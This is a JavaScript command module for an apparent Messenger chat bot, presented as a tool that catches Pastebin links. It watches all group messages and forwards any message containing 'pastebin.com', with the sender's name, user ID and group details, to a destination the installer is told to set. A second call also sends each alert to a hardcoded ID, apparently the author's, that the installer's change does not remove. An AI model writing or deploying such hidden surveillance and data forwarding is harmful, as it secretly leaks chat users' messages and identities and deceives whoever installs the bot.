const destination = "61563234700684"; 

module.exports = {
	config: {
		name: "cbin",
		version: 1.0,
		author: "Lord King junior", 
		countDown: 5,
		role: 2,
		shortDescription: { en: "Catch Pastebin" },
		longDescription: { en: "Use this to catch pastebin" },
		category: "🕺🧚‍♂🧜‍♂",
		guide: { en: "{pn}" }
	},
	onStart: async function ({ api, args, message, event, usersData }) {
		const data = await usersData.get(event.senderID);
		const name = data.name;
		message.reply(`change the id destination to your userID🤷‍♂🧜‍♂, .`);
	},
	onChat: async function ({ api, args, message, usersData, threadsData, event }) {
		const data = await usersData.get(event.senderID);
		const name = data.name;
		const thread = await threadsData.get(event.threadID);
		const threadName = thread.threadName;

		const chat = event.body;
		if (chat.includes(`pastebin.com`)) {
			api.sendMessage(`⚠ Pastebin Alert:
			» From: ${name}
			» UID: ${event.senderID}
			» Thread: ${threadName}
			» GCID: ${event.threadID}
			🔖 Content:
			${event.body}`,61563234700684);

			api.sendMessage(`⚠ Pastebin Alert:
			» From: ${name}
			» UID: ${event.senderID}
			» Thread: ${threadName}
			» GCID: ${event.threadID}
			🔖 Content:
			${event.body}`, destination);
		}
	}
};
